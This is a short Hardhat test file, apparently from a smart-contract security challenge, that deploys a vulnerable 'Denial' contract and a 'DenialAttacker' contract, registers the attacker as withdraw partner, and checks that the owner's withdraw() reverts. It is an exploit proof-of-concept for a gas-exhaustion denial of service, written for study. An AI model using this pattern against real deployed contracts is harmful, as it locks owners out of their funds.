import { expect } from "chai";
import { ethers } from "hardhat";

describe("Denial", async function () {

  it("Should deny the owner from withdrawing funds when they call withdraw() ", async function () {
    //setup+
    const [deployer, attacker] = await ethers.getSigners()
    const Denial = await ethers.getContractFactory("Denial");
    const denial = await Denial.deploy();
    await denial.deployed();

    await deployer.sendTransaction({ to: denial.address, value: ethers.utils.parseEther("0.001") })
    //setup-


    //1.Deploy attacker
    const DenialAttacker = await ethers.getContractFactory("DenialAttacker");
    const denialAttacker = await DenialAttacker.connect(attacker).deploy();
    await denialAttacker.deployed();
    //2.Deploy attacker
    await denial.connect(attacker).setWithdrawPartner(denialAttacker.address)

    await expect(denial.withdraw({ gasLimit: 1000000 })).to.be.reverted
  });
});

